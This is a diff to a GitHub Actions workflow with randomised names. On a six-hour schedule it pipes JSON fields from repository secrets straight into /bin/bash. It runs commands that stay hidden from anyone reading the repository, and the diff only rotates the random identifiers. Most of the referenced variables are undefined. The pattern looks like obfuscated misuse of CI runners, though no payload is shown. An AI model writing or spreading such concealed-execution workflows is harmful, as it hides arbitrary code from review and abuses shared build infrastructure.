@@ -1,26 +1,28 @@
 name: lujiancheng2345
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 4/6 * * *'
-jobs:  # 28638
+    - cron: '44 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujiancheng2345
         env:
-          bjn901: ${{ secrets.bjn901 }}
+          qz2648: ${{ secrets.qz2648 }}
         run: |
-          echo $bjn901 | jq -r .zrw756 | /bin/bash
-          echo $iam6160 | jq -r .we6240 | /bin/bash
-          echo $v63 | jq -r .kvceq1 | /bin/bash
-          echo $hyioh8329 | jq -r .acbyf3095 | /bin/bash
-          echo $ikxhh6 | jq -r .two0706 | /bin/bash
-          echo $tgxz60 | jq -r .gyqxy1 | /bin/bash
-          echo $smtg1436 | jq -r .pqru806 | /bin/bash
-          echo $vy7 | jq -r .pegyp9 | /bin/bash
-          echo $cxzsi77873 | jq -r .kxon7 | /bin/bash
-          echo $da0 | jq -r .vf666 | /bin/bash
+          echo $qz2648 | jq -r .ysz4 | /bin/bash
+          echo $tsd6498 | jq -r .hdhe80998 | /bin/bash
+          echo $x1883 | jq -r .egvk27784 | /bin/bash
+          echo $gp9134 | jq -r .lmpj63510 | /bin/bash
+          echo $nl13 | jq -r .cb779 | /bin/bash
+          echo $x0 | jq -r .f118 | /bin/bash
+          echo $nstg11979 | jq -r .lmly4 | /bin/bash
+          echo $zn33 | jq -r .b87144 | /bin/bash
+          echo $b36 | jq -r .sicx436 | /bin/bash
+          echo $vjudd2 | jq -r .evl236 | /bin/bash
+          echo $bkj853 | jq -r .l10502 | /bin/bash
 
